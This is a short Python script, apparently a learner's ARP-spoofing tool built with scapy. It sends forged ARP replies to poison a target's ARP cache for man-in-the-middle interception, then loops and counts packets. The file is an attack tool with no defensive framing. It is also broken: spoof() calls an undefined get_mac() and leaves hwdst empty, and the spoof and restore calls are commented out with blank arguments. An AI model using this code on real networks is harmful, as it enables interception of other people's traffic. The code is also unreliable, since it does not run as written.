#!/usr/bin/env python

import scapy.all as scapy
import time

def mac_scan(ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst="", psrc=spoof_ip)
	scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
	dest_mac = mac_scan(dest_ip)
	src_mac = mac_scan(src_ip)
	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
	scapy.send(packet, count=4, verbose=False)

sent_packets_count = 0
try:
	while True:
#		spoof(,)
#		spoof(,)
		sent_packets_count = sent_packets_count + 2
		print("\r[+] Total packets sent: " + str(sent_packets_count), end="")
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[+] Exiting program...")
#	restore(,)
#	print("\n[+] Resetting ARP Tables..."
